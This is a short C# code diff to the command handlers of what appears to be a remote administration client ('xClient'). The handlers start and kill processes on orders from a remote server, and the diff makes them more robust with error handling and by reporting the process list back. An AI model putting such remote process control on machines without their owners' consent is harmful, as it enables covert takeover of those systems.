@@ -312,18 +312,29 @@ namespace xClient.Core.Commands
                 Process.GetProcessById(command.PID).Kill();
             }
             catch
+            { }
+            finally
             {
+                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
             }
-
-            HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
         }
 
         public static void HandleStartProcess(Packets.ServerPackets.StartProcess command, Client client)
         {
-            ProcessStartInfo startInfo = new ProcessStartInfo {UseShellExecute = true, FileName = command.Processname};
-            Process.Start(startInfo);
-
-            HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
+            if (!string.IsNullOrEmpty(command.Processname))
+            {
+                try
+                {
+                    ProcessStartInfo startInfo = new ProcessStartInfo { UseShellExecute = true, FileName = command.Processname };
+                    Process.Start(startInfo);
+                }
+                catch
+                { }
+                finally
+                {
+                    HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
+                }
+            }
         }
 
         public static void HandleDrives(Packets.ServerPackets.Drives command, Client client)
